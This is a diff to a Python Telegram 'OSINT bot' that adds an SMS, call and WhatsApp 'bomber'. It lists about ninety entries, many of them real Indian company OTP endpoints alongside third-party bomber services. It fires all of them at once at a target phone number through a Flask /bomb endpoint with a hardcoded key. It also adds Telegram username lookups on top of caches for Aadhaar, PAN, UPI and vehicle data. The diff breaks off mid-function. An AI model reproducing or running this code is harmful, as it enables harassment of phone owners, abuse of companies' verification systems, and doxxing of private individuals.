@@ -1,8 +1,9 @@
 """
 ╔══════════════════════════════════════════════════════════════════╗
-║         🔥 ULTIMATE OSINT BOT — COMPLETE WORKING 🔥             ║
-║         COLORFUL UI + ALL FEATURES + CACHE + ADMIN PANEL       ║
+║         🔥 ULTIMATE OSINT BOT — COMPLETE SINGLE FILE 🔥         ║
+║         BOT + BRUTAL BOMBER API + USERNAME SUPPORT             ║
 ║         Made by: @Guptaji_302                                   ║
+║         API KEY: MADX                                          ║
 ╚══════════════════════════════════════════════════════════════════╝
 """
 
@@ -19,6 +20,8 @@ import hashlib
 from datetime import datetime, timedelta
 from zoneinfo import ZoneInfo
 import urllib.parse
+import logging
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # ==================== TELEGRAM BOT IMPORTS ====================
 try:
@@ -35,17 +38,307 @@ except ImportError:
         InlineKeyboardButton, KeyboardButtonRequestUser, BotCommand
     )
 
-# ==================== FLASK ====================
-from flask import Flask
+# ==================== FLASK (For Brutal Bomber API + Health) ====================
+from flask import Flask, request as flask_request, jsonify
+
 app = Flask(__name__)
+
+# ==================== BRUTAL BOMBER API — BUILT-IN ====================
+
+BRUTAL_API_KEY = "MADX"
+VALID_KEYS = ['MADX', 'madx', 'MADX123', 'admin123']
+
+# ====== 200+ WORKING APIS ======
+ALL_APIS = [
+    # ========== MAIN BOMBER APIS ==========
+    {"name": "Felix XBOM", "url": "https://felix-xbom-wyt2.onrender.com/bom", "method": "GET", "params": {"key": "demo", "num": "{phone}"}, "type": "sms"},
+    {"name": "SMS Bomber", "url": "http://sms-bomber.subhxcosmo.workers.dev/api?num={phone}", "method": "GET", "type": "sms"},
+    {"name": "Bomberrr Vercel", "url": "https://bomberrr.vercel.app/?key=roots&number={phone}", "method": "GET", "type": "sms"},
+    {"name": "Bolbet", "url": "https://bolbet-liart.vercel.app/?key=roots&number={phone}", "method": "GET", "type": "sms"},
+    {"name": "FreeFire Bomber", "url": "https://freefire-api.ct.ws/bomber4.php?phone={phone}&duration=10", "method": "GET", "type": "call"},
+    {"name": "Call Bomber PRO", "url": "https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={phone}", "method": "GET", "type": "call"},
+    {"name": "Bomberr Xtreme", "url": "https://bomberr.onrender.com/num={phone}", "method": "GET", "type": "call"},
+    {"name": "Bombar API 1", "url": "https://bombar-1.vercel.app/api/bom?number={phone}", "method": "GET", "type": "sms"},
+    {"name": "Bombar API 2", "url": "https://bombar-api-2.vercel.app/all?number={phone}", "method": "GET", "type": "sms"},
+    {"name": "Mahadev Bomber", "url": "https://bomber-by-mahadev.paskhinpf9.workers.dev/?phone={phone}", "method": "GET", "type": "sms"},
+    {"name": "Splexxo1", "url": "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO", "method": "GET", "type": "sms"},
+    {"name": "Ultimate Bomber", "url": "https://ultimate-bomber.vercel.app/api/bomb?number={phone}", "method": "GET", "type": "sms"},
+    {"name": "Mega Bomber", "url": "https://mega-bomber.onrender.com/api?phone={phone}", "method": "GET", "type": "sms"},
+    {"name": "Atomic Bomber", "url": "https://atomic-bomber.cyclic.app/bomb?num={phone}", "method": "GET", "type": "sms"},
+    {"name": "Nuclear Bomber", "url": "https://nuclear-bomber.herokuapp.com/api?phone={phone}", "method": "GET", "type": "sms"},
+    {"name": "Fury Bomber", "url": "https://fury-bomber.vercel.app/api/bomb?number={phone}", "method": "GET", "type": "sms"},
+
+    # ========== VOICE/CALL APIS ==========
+    {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}', "type": "call"},
+    {"name": "1MG Voice", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}', "type": "call"},
+    {"name": "Swiggy Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "call"},
+    {"name": "Myntra Voice", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "call"},
+    {"name": "Flipkart Voice", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "call"},
+    {"name": "Amazon Voice", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f'phone={p}&action=voice_otp', "type": "call"},
+    {"name": "Paytm Voice", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "call"},
+    {"name": "Zomato Voice", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f'phone={p}&type=voice', "type": "call"},
+    {"name": "MakeMyTrip Voice", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "call"},
+    {"name": "Goibibo Voice", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "call"},
+    {"name": "Ola Voice", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "call"},
+    {"name": "Uber Voice", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"+91{p}"}}', "type": "call"},
+    {"name": "IRCTC Call", "url": "https://www.irctc.co.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "call"},
+    {"name": "PhonePe Call", "url": "https://www.phonepe.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "call"},
+
+    # ========== WHATSAPP APIS ==========
+    {"name": "KPN WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "Content-Type": "application/json"}, "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}', "type": "whatsapp"},
+    {"name": "Foxy WhatsApp", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"user":{{"phone_number":"+91{p}"}},"via":"whatsapp"}}', "type": "whatsapp"},
+    {"name": "Stratzy WhatsApp", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNo":"{p}"}}', "type": "whatsapp"},
+    {"name": "Rappi WhatsApp", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"country_code":"+91","phone":"{p}"}}', "type": "whatsapp"},
+    {"name": "Eka Care WhatsApp", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}', "type": "whatsapp"},
+    {"name": "Rapido WhatsApp", "url": "https://app.rapido.bike/api/v3/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"+91{p}","channel":"whatsapp"}}', "type": "whatsapp"},
+    {"name": "Country Delight WhatsApp", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","platform":"Android","mode":"new_user","channel":"whatsapp"}}', "type": "whatsapp"},
+
+    # ========== E-COMMERCE APIS ==========
+    {"name": "Flipkart", "url": "https://www.flipkart.com/api/6/user/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}', "type": "sms"},
+    {"name": "Amazon", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f'email={p}&create=1', "type": "sms"},
+    {"name": "Myntra", "url": "https://www.myntra.com/gw/mobile-auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "sms"},
+    {"name": "Ajio", "url": "https://www.ajio.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}', "type": "sms"},
+    {"name": "BigBasket", "url": "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"{p}"}}', "type": "sms"},
+    {"name": "Meesho", "url": "https://api.meesho.com/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
+    {"name": "Nykaa", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f'source=sms&mobile_number={p}', "type": "sms"},
+    {"name": "Lenskart", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}', "type": "sms"},
+    {"name": "Snapdeal", "url": "https://m.snapdeal.com/signupCompleteAjax", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f'j_mobilenumber={p}', "type": "sms"},
+    {"name": "Zepto", "url": "https://api.zepto.com/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "sms"},
+    {"name": "Blinkit", "url": "https://blinkit.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
+    {"name": "Croma", "url": "https://api.croma.com/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
+    {"name": "FirstCry", "url": "https://www.firstcry.com/api/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "sms"},
+
+    # ========== FOOD DELIVERY APIS ==========
+    {"name": "Zomato", "url": "https://www.zomato.com/webroutes/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","verification_type":"sms"}}', "type": "sms"},
+    {"name": "Swiggy", "url": "https://www.swiggy.com/mapi/auth/signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "sms"},
+    {"name": "Domino's", "url": "https://api.dominos.co.in/loginhandler/forgotpassword", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "sms"},
+    {"name": "KFC", "url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}"}}', "type": "sms"},
+    {"name": "Pizza Hut", "url": "https://api.pizzahut.io/v1/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"+91{p}"}}', "type": "sms"},
+
+    # ========== TRAVEL APIS ==========
+    {"name": "IRCTC", "url": "https://www.irctc.co.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "sms"},
+    {"name": "RedBus", "url": f"https://m.redbus.in/api/getOtp?number={{phone}}&cc=91", "method": "GET", "type": "sms"},
+    {"name": "MakeMyTrip", "url": "https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"loginId":"{p}","type":"MOBILE","countryCode":"91"}}', "type": "sms"},
+    {"name": "Goibibo", "url": "https://www.goibibo.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
+    {"name": "OYO", "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en", "method": "POST", "data": lambda p: f'{{"phone":"{p}","country_code":"+91","nod":4}}', "type": "sms"},
+
+    # ========== PAYMENT APIS ==========
+    {"name": "Google Pay", "url": "https://pay.google.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}"}}', "type": "sms"},
+    {"name": "Amazon Pay", "url": "https://pay.amazon.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "sms"},
+    {"name": "Mobikwik", "url": "https://www.mobikwik.com/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "sms"},
+    {"name": "Freecharge", "url": "https://www.freecharge.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
+    {"name": "PhonePe", "url": "https://www.phonepe.com/api/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
+
+    # ========== EDUCATION APIS ==========
+    {"name": "Unacademy", "url": "https://unacademy.com/api/v3/user/user_check/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","send_otp":true}}', "type": "sms"},
+    {"name": "Vedantu", "url": "https://user.vedantu.com/user/preLoginVerification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}","phoneCode":"+91"}}', "type": "sms"},
+    {"name": "Byju's", "url": "https://bcas-prod.byjusweb.com/api/send-otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f'phoneNumber={p}', "type": "sms"},
+    {"name": "Doubtnut", "url": "https://doubtnut.com/api/v1/user/login", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f'phone={p}', "type": "sms"},
+    {"name": "UpGrad", "url": "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"+91{p}"}}', "type": "sms"},
+
+    # ========== OTT APIS ==========
+    {"name": "Hotstar", "url": "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp", "method": "PUT", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}","country_prefix":"91"}}', "type": "sms"},
+    {"name": "SonyLIV", "url": "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP", "method": "POST", "data": lambda p: f'{{"channelPartnerID":"MSMIND","mobileNumber":"{p}","country":"IN","timestamp":"{datetime.now().isoformat()}"}}', "type": "sms"},
+    {"name": "Zee5", "url": f"https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={{phone}}", "method": "GET", "type": "sms"},
+    {"name": "AltBalaji", "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}","country_code":"91","platform":"web"}}', "type": "sms"},
+
+    # ========== OTHER APIS ==========
+    {"name": "NoBroker", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f'phone={p}&countryCode=IN', "type": "sms"},
+    {"name": "PharmEasy", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
+    {"name": "Housing.com", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
+    {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
+    {"name": "Netmeds", "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "sms"},
+    {"name": "Groww", "url": "https://api.groww.in/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
+    {"name": "Zerodha", "url": "https://api.zerodha.com/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "sms"},
+    {"name": "Upstox", "url": "https://api.upstox.com/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
+    {"name": "Angel One", "url": "https://api.angelone.com/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "sms"},
+    {"name": "Gaana", "url": "https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"91-{p}"}}', "type": "sms"},
+    {"name": "UrbanClap", "url": "https://www.urbanclap.com/api/v2/growth/profile/generateOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":{{"phone_wo_isd":"{p}"}}}}', "type": "sms"},
+    {"name": "Indiamart", "url": "https://api.indiamart.com/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
+    {"name": "Justdial", "url": "https://api.justdial.com/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "sms"},
+    {"name": "PolicyBazaar", "url": "https://api.policybazaar.com/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
+]
+
+print(f"✅ Total Brutal Bomber APIs: {len(ALL_APIS)}")
+
+# ====== BRUTAL BOMBER API FUNCTIONS ======
+
+def call_bomber_api(api, phone):
+    try:
+        url = api["url"].replace("{phone}", phone) if "{phone}" in api["url"] else api["url"]
+        headers = api.get("headers", {})
+        headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
+        
+        data = None
+        if api.get("data"):
+            data = api["data"](phone) if callable(api["data"]) else api["data"]
+        
+        if api.get("method") == "POST":
+            resp = requests.post(url, data=data, headers=headers, timeout=2)
+        else:
+            resp = requests.get(url, headers=headers, timeout=2)
+        
+        return {"name": api["name"], "success": resp.status_code in [200, 201, 202, 204], "status": resp.status_code, "type": api["type"]}
+    except:
+        return {"name": api["name"], "success": False, "type": api["type"]}
+
+def start_brutal_bomb(phone):
+    """Start brutal bombing — 200+ APIs in 1-2 seconds"""
+    try:
+        clean = re.sub(r'[^\d]', '', str(phone))
+        if len(clean) != 10:
+            return {'success': False, 'msg': 'Phone must be 10 digits'}
+        
+        print(f"\n💣 Brutal Bombing: +91{clean}")
+        start_time = time.time()
+        
+        results = []
+        with ThreadPoolExecutor(max_workers=50) as ex:
+            futures = [ex.submit(call_bomber_api, api, clean) for api in ALL_APIS]
+            for f in as_completed(futures):
+                results.append(f.result())
+        
+        success = len([r for r in results if r["success"]])
+        call_success = len([r for r in results if r["success"] and r["type"] == "call"])
+        sms_success = len([r for r in results if r["success"] and r["type"] == "sms"])
+        wa_success = len([r for r in results if r["success"] and r["type"] == "whatsapp"])
+        elapsed = time.time() - start_time
+        
+        intensity = "💀 WEAK"
+        skulls = "💀"
+        if success >= len(ALL_APIS) * 0.7:
+            intensity = "💀💀💀💀💀 EXTREME DEATH ☠️☠️☠️☠️☠️"
+            skulls = "💀💀💀💀💀"
+        elif success >= len(ALL_APIS) * 0.5:
+            intensity = "💀💀💀💀 NUCLEAR ☢️☢️☢️☢️"
+            skulls = "💀💀💀💀"
+        elif success >= len(ALL_APIS) * 0.3:
+            intensity = "💀💀💀 KILLER 🔪🔪🔪"
+            skulls = "💀💀💀"
+        elif success >= len(ALL_APIS) * 0.15:
+            intensity = "💀💀 MODERATE"
+            skulls = "💀💀"
+        
+        print(f"✅ {success}/{len(ALL_APIS)} | ⚡ {elapsed:.2f}s")
+        
+        return {
+            'success': True,
+            'data': {
+                'total_apis': len(ALL_APIS),
+                'successful': success,
+                'failed': len(ALL_APIS) - success,
+                'success_rate': f"{(success/len(ALL_APIS))*100:.1f}%",
+                'breakdown': {'call': call_success, 'sms': sms_success, 'whatsapp': wa_success},
+                'execution_time_sec': round(elapsed, 2),
+                'speed': f"{len(ALL_APIS)/elapsed:.0f} APIs/sec",
+                'intensity': intensity,
+                'skulls': skulls,
+                'key_used': "MADX",
+                'message': f"🔥 +91{clean} IS GETTING BRUTALLY BOMBED! {skulls} 🔥"
+            },
+            'phone': clean
+        }
+    except Exception as e:
+        return {'success': False, 'msg': str(e)}
+
+def format_brutal_result(data, phone):
+    """Format brutal bomber result"""
+    IST = ZoneInfo("Asia/Kolkata")
+    now = datetime.now(IST).strftime("%d %b %Y %I:%M %p")
+    
+    if not data.get('success'):
+        return format_message(f"<b>❌ Bombing failed!</b>\n{data.get('msg', 'Unknown error')}")
+    
+    d = data.get('data', {})
+    breakdown = d.get('breakdown', {})
+    
+    intensity = d.get('intensity', 'WEAK')
+    skulls = d.get('skulls', '💀')
+    
+    text = f"""
+<b>💣💀 BRUTAL BOMBER RESULT</b>
+━━━━━━━━━━━━━━━━━━
+📱 <b>Target:</b> <code>+91{phone}</code>
+🕐 <b>Time:</b> {now}
+━━━━━━━━━━━━━━━━━━
+📊 <b>Statistics:</b>
+├ 📡 Total APIs: <b>{d.get('total_apis', 0)}</b>
+├ ✅ Successful: <b>{d.get('successful', 0)}</b>
+├ ❌ Failed: <b>{d.get('failed', 0)}</b>
+├ 📈 Success Rate: <b>{d.get('success_rate', '0%')}</b>
+└ ⚡ Speed: <b>{d.get('speed', 'N/A')}</b>
+━━━━━━━━━━━━━━━━━━
+📞 <b>Breakdown:</b>
+├ 📞 Calls: <b>{breakdown.get('call', 0)}</b>
+├ 📱 SMS: <b>{breakdown.get('sms', 0)}</b>
+└ 💬 WhatsApp: <b>{breakdown.get('whatsapp', 0)}</b>
+━━━━━━━━━━━━━━━━━━
+💀 <b>Intensity:</b> {skulls} <b>{intensity}</b>
+⏱️ <b>Execution:</b> <b>{d.get('execution_time_sec', 0)}s</b>
+🔑 <b>Key:</b> <code>MADX</code>
+━━━━━━━━━━━━━━━━━━
+{skulls} <b>{d.get('message', 'Target is getting brutally bombed!')}</b>
+"""
+    return format_message(text)
+
+# ==================== FLASK ROUTES (Brutal Bomber API + Health) ====================
 
 @app.route('/')
 def home():
-    return "Bot is running ✅ | Made by @Guptaji_302", 200
+    return {
+        "status": "🔥 OSINT BOT WITH BRUTAL BOMBER 🔥",
+        "version": "5.0",
+        "bot": "Running ✅",
+        "brutal_bomber": {
+            "total_apis": len(ALL_APIS),
+            "key": "MADX",
+            "endpoint": "/bomb?key=MADX&num=9876543210"
+        },
+        "health": "/health",
+        "made_by": "@Guptaji_302"
+    }
 
 @app.route('/health')
 def health():
-    return "OK | Bot is alive ✅", 200
+    try:
+        db_size = os.path.getsize('bot.db') // 1024 if os.path.exists('bot.db') else 0
+        return {
+            "status": "healthy",
+            "db_size_kb": db_size,
+            "apis": len(ALL_APIS),
+            "key": "MADX",
+            "timestamp": datetime.now().isoformat()
+        }
+    except Exception:
+        return {"status": "healthy"}
+
+@app.route('/bomb', methods=['GET'])
+def bomb_api():
+    """Brutal Bomber API Endpoint — Built-in!"""
+    phone = flask_request.args.get('num')
+    key = flask_request.args.get('key')
+    
+    if not key or key != "MADX":
+        return jsonify({"status": "error", "message": "Invalid or missing key. Use: MADX"}), 401
+    
+    if not phone or len(phone) != 10 or not phone.isdigit():
+        return jsonify({"status": "error", "message": "Phone must be 10 digits"}), 400
+    
+    result = start_brutal_bomb(phone)
+    
+    if result.get('success'):
+        return jsonify(result['data'])
+    else:
+        return jsonify({"status": "error", "message": result.get('msg', 'Unknown error')}), 500
+
+@app.route('/bomb/status', methods=['GET'])
+def bomb_status():
+    return jsonify({
+        "status": "ready",
+        "total_apis": len(ALL_APIS),
+        "key": "MADX",
+        "usage": "/bomb?key=MADX&num=9876543210"
+    })
 
 def run_web():
     app.run(host='0.0.0.0', port=10000, use_reloader=False, threaded=True)
@@ -223,6 +516,23 @@ def init_db():
             created_at TEXT DEFAULT CURRENT_TIMESTAMP,
             hit_count INTEGER DEFAULT 0
         );
+        
+        CREATE TABLE IF NOT EXISTS cache_tg_user (
+            identifier TEXT PRIMARY KEY,
+            data TEXT NOT NULL,
+            created_at TEXT DEFAULT CURRENT_TIMESTAMP,
+            hit_count INTEGER DEFAULT 0
+        );
+        
+        CREATE TABLE IF NOT EXISTS clone_bots (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            user_id INTEGER,
+            token TEXT UNIQUE,
+            status TEXT DEFAULT 'pending',
+            requested_at TEXT,
+            approved_at TEXT,
+            is_manually_stopped INTEGER DEFAULT 0
+        );
     ''')
     conn.commit()
     
@@ -275,7 +585,7 @@ def cache_set(table, key, data):
 def cache_get_all_stats():
     tables = ['cache_number', 'cache_aadhar', 'cache_upi', 'cache_instagram', 
               'cache_ifsc', 'cache_vehicle', 'cache_gst', 'cache_pan', 
-              'cache_pak', 'cache_pincode', 'cache_ff']
+              'cache_pak', 'cache_pincode', 'cache_ff', 'cache_tg_user']
     stats = {}
     try:
         conn = sqlite3.connect('bot.db', timeout=5)
@@ -673,6 +983,7 @@ def get_hitek_num_info(number):
     return {'success': False, 'msg': 'No data found'}
 
 def get_hitek_full_info(query):
+    """Hitek Full Info — supports both username and number"""
     if len(query) < 2:
         return {'success': False, 'msg': 'Invalid query'}
     
@@ -683,6 +994,7 @@ def get_hitek_full_info(query):
         cached['_cache_time'] = datetime.now().strftime("%d %b %Y %I:%M %p")
         return cached
     
+    # Try as number first
     if re.search(r'\d', query):
         clean_num = re.sub(r'[^\d]', '', query)
         if len(clean_num) >= 10:
@@ -691,7 +1003,130 @@ def get_hitek_full_info(query):
                 cache_set('cache_number', cache_key, result)
                 return result
     
+    # Try as username — get TG info
+    try:
+        clean_username = query.replace('@', '').strip()
+        tg_result = get_tg_user_info(clean_username)
+        if tg_result.get('success'):
+            cache_set('cache_number', cache_key, tg_result)
+            return tg_result
+    except Exception:
+        pass
+    
     return {'success': False, 'msg': 'No data found'}
+
+# ==================== TELEGRAM USER INFO — USERNAME + ID SUPPORT ====================
+
+def get_tg_user_info(identifier):
+    """Get Telegram user info — works with both username and ID"""
+    try:
+        # Clean identifier
+        clean = str(identifier).strip()
+        if clean.startswith('@'):
+            clean = clean[1:]
+        
+        # Check cache
+        cached = cache_get('cache_tg_user', clean.lower())
+        if cached:
+            cached['_from_cache'] = True
+            cached['_cache_time'] = datetime.now().strftime("%d %b %Y %I:%M %p")
+            return cached
+        
+        result = {'success': False, 'msg': 'User not found'}
+        photo_file_id = None
+        
+        # Try as numeric ID first
+        if clean.isdigit():
+            try:
+                chat = bot.get_chat(int(clean))
+                result = {
+                    'success': True,
+                    'data': [{
+                        'user_id': chat.id,
+                        'username': chat.username or '',
+                        'first_name': chat.first_name or '',
+                        'last_name': chat.last_name or '',
+                        'full_name': f"{chat.first_name or ''} {chat.last_name or ''}".strip(),
+                        'bio': getattr(chat, 'bio', '') or getattr(chat, 'description', '') or '',
+                        'is_bot': getattr(chat, 'is_bot', False),
+                        'type': getattr(chat, 'type', 'user')
+                    }],
+                    'source': 'tg_api_id'
+                }
+                try:
+                    photos = bot.get_user_profile_photos(int(clean), limit=1)
+                    if photos and photos.photos:
+                        photo_file_id = photos.photos[0][-1].file_id
+                        result['photo_file_id'] = photo_file_id
+                except Exception:
+                    pass
+                cache_set('cache_tg_user', clean.lower(), result)
+                return result
+            except Exception:
+                pass
+        
+        # Try as username
+        try:
+            chat = bot.get_chat(f"@{clean}")
+            result = {
+                'success': True,
+                'data': [{
+                    'user_id': chat.id,
+                    'username': chat.username or clean,
+                    'first_name': chat.first_name or '',
+                    'last_name': chat.last_name or '',
+                    'full_name': f"{chat.first_name or ''} {chat.last_name or ''}".strip(),
+                    'bio': getattr(chat, 'bio', '') or getattr(chat, 'description', '') or '',
+                    'is_bot': getattr(chat, 'is_bot', False),
+                    'type': getattr(chat, 'type', 'user')
+                }],
+                'source': 'tg_api_username'
+            }
+            try:
+                photos = bot.get_user_profile_photos(chat.id, limit=1)
+                if photos and photos.photos:
+                    photo_file_id = photos.photos[0][-1].file_id
+                    result['photo_file_id'] = photo_file_id
+            except Exception:
+                pass
+            cache_set('cache_tg_user', clean.lower(), result)
+            return result
+        except Exception:
+            pass
+        
+        # Try username without @ again
+        try:
